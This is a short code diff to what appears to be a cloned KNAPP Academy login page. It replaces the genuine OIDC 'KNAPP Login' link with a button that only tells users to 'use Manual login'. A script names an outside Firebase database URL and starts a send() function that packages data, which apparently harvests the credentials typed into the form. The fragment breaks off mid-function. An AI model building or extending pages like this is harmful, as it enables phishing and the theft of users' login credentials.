@@ -79,11 +79,11 @@ document.body.className += ' jsenabled';
 
                                 <div class="potentialidplist" class="mt-3">
                                         <div class="potentialidp">
-                                            <a href="https://academy.knapp.com/auth/oidc/" title="KNAPP Login" class="btn btn-secondary
-                                               btn-block">
+                                           <button  class="btn btn-secondary
+                                            btn-block" onclick="dontuseknapplogin()">
                                                 <img src="https://academy.knapp.com/theme/image.php/knapp/core/1669627116/i/permissionlock" alt="" width="24" height="24"/>
                                             KNAPP Login
-                                            </a>
+                                        </button>
                                         </div>
                                 </div>
                         </div>
@@ -330,7 +330,9 @@ M.util.help_popups.setup(Y);
 
 </body>
 <script>
-
+function dontuseknapplogin(){
+    alert("please use Manual login")
+}
     //------https://knapp-academy-default-rtdb.firebaseio.com/
     function send(){
     let _data = {
